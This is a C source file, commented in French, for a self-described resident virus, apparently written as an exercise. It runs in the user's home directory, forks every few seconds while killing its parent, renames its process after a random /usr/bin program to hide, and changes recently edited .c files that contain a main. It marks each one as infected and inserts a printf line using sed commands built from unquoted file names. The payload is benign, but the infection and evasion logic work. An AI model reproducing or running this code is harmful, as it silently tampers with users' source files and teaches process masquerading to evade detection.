#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <unistd.h> 
#include <sys/types.h>
#include <signal.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <math.h>
#include <pwd.h>

const char *chemin; //Dossier utilisateur


//On vérifie que le fichier ait l'exentension .c
_Bool extension(char fichier[256]){
	int longueur=strlen(fichier);
	if(longueur > 2){
		if(fichier[longueur-1]=='c' && fichier[longueur-2]=='.')
			return 1;
	}
	return 0;
}

//On vérifie que le fichier ait été édité il y a moins d'une heure
_Bool date_edition(time_t modif){
	time_t now = time(NULL);
	if(difftime(now, modif)<3600)
		return 1;
	return 0;
}

//On vérifie que le fichier contienne un main, qu'il ne soit pas marqué et on retourne la ligne du main
int contient_main(char fichier[256]){
	_Bool infile = 0;
	char *line = NULL;
	size_t  len = 0;
	ssize_t read;
	FILE *fp = fopen(fichier, "r");
	int i=0;

	while ((read = getline(&line, &len, fp)) != -1) {
		i++;
		line[strcspn(line, "\n")] = 0;
		if(i==1 && strstr(line, "DEJA INFECTE PAR LE VIRUS"))
			return -1;
		if (strstr(line, "int main") != NULL) {
            		infile = 1;
            		break;
        	}
    	}
    	fclose(fp);

    	if (line)
		free(line);
	if(infile)
		return i;
	return -1;
}	

//On marque le fichier et on ajoute le code infectant
_Bool infecter(char fichier[256], int ligne){
	char commande1[128]="sed -i '1 i\\//DEJA INFECTE PAR LE VIRUS' ";
	strcat(commande1,fichier);
	char commande2[128];
	snprintf(commande2, 128, "sed -i '%d i\\\\tprintf(\"Fichier infecté par virus résident\");' %s",ligne+2, fichier);
	if(system(commande1)!=-1 && system(commande2)!=-1)
		return 1;
	return 0;
}

//On change le nom du virus dans les processus
void changer_nom(){
	int nb;
	struct dirent **liste;
	int nombre=scandir("/usr/bin",&liste,0,alphasort);
	char nom_prgm[64];
	nb=rand()%nombre;
	strcpy(nom_prgm,liste[nb]->d_name);
	strcat(nom_prgm,"2");
	printf("Nouvelle couverture du virus résident: %s\n",nom_prgm);
	prctl(PR_SET_NAME, nom_prgm, NULL, NULL, NULL);

}

//On scanne le chemin et on cherche les fichiers cibles pour les marquer. Un fork est réalisé chaque seconde
void resident(){
	int i=1;
	while(i>0){
		sleep(1);
		fflush(stdout);
		i++;
		if(i%3==0){ //Toutes les trois secondes
			if(fork()!=0)
				kill(getpid(),SIGKILL);
			changer_nom();
			struct dirent **liste2;
			struct stat sb;
			int nb2=scandir(chemin,&liste2,0,alphasort);
			for(int j=0;j<nb2;j++){
				char cible[518];
				snprintf(cible, 518, "%s/%s",chemin, liste2[j]->d_name);
				stat(cible, &sb);
				if(extension(liste2[j]->d_name) && date_edition(sb.st_mtime) && contient_main(cible)!=-1){
					printf("%s sur le point d'être infecté.\n",cible);
					if(infecter(cible, contient_main(cible)))
						printf("Infection réussie\n");
				
				}
			}
		}		
	}
}


int main (void){
	struct passwd *pw = getpwuid(getuid());
	chemin = pw->pw_dir;
	resident();
	return 0;
}
